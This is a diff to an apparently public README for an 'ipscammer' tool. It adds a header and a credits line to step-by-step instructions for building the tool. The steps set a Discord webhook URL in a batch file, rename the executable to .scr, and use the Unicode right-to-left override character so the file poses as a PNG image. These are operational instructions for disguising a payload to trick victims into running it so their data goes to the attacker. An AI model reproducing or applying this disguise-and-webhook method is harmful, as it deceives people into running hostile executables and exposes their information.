@@ -1,3 +1,5 @@
+------ Instructions -------
+
 Step 1: download the .zip file
 
 Step 2: change the webhook url un "ipscammer.bat" to your url
@@ -19,3 +21,10 @@ Step 9: now change the ".exe" sufix to ".scr" and hit enter
 Step 10: i named it "pic.scr" now type, before the dot (.) "gnp" now go betwen "pic" and "gnp", now right click and choose "unicode control symbols" or something like that, now chose "RLO" and hit enter. it wil reverse all characters after the "RLO" now it looks like a png.
 
 you did it!!
+
+
+------ Credits ------
+
+thanks to *Phoenix125 | http://www.Phoenix125.com* for the "DiscordSendWebook.exe" code
+
+
